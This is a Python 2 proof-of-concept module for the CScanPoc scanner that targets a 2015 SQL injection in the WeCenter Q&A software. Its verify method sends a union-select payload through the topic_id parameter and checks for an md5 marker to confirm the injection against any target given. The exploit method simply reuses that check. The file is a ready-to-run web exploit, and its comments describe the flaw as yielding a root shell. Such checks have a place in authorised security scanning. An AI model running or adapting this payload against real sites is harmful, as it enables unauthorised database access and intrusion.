# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'WeCenter_0001' # 平台漏洞编号，留空
    name = 'WeCenter sql注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-07-12'  # 漏洞公布时间
    desc = '''
        WeCenter SQL注射（ROOT SHELL）.
    ''' # 漏洞描述
    ref = 'http://0day5.com/archives/3760/' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0106369
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = 'WeCenter'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9f19feff-cb55-4921-87dd-1cd1ee45ba96'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/explore/UPLOAD/?/topic/ajax/question_list/type-best&topic_id=1%29%20union%20select%20md5(1)%23'
            target = arg + payload
            
            code, head, res, errcode, _ = hh.http(target);
            if code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()